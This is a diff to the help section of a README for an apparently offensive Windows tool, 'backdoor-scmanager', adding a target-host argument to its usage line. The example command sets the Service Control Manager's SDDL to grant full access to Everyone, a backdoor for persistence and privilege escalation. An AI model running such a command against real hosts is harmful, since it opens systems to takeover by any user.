@@ -44,8 +44,8 @@ Backdoors SCManager SDDL.
 ### Help
 
 ```
-usage:    backdoor-scmanager <SDDL_TO_SET>
-example:  backdoor-scmanager D:(A;;KA;;;WD)
+usage:    backdoor-scmanager <TARGET_HOST> <SDDL_TO_SET>
+example:  backdoor-scmanager SRV01.megacorp.local D:(A;;KA;;;WD)
 ```
 
 ### References
